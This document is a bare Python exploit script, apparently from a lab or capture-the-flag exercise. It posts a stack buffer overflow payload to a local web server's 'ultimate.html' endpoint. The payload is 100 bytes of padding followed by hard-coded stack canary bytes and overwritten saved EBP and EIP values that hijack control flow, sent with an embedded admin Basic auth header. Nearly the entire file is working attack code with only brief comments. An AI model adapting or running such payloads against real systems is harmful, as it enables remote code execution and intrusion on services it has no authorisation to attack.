import requests

headers = {
    'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://127.0.0.1:8000',
    'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
    'Connection': 'keep-alive',
    'Referer': 'http://127.0.0.1:8000/',
    'Upgrade-Insecure-Requests': '1',
}

# canary = i.to_bytes(4, byteorder='little')
data = b'A' * 100  # <-- buffer
data += b'\x00\xe2\x4c\xe7'  # <-- canary
data += b'\x00\x70\x5c\x56'  # <-- canary
data += b'\x00\x70\x5c\x56'  # <-- canary
data += b'\x78\x58\x8e\xff'  # <-- saved $ebp
data += b'\x6d\x49\x5c\x56'  # <-- saved $eip
try:
    response = requests.post('http://127.0.0.1:8000/ultimate.html', headers=headers, data=data)
    status_code = response.status_code
    print("status_code = [" + str(status_code) + "]")
    print("text = [" + response.text + "]")
except requests.exceptions.RequestException as e:
    print(e)
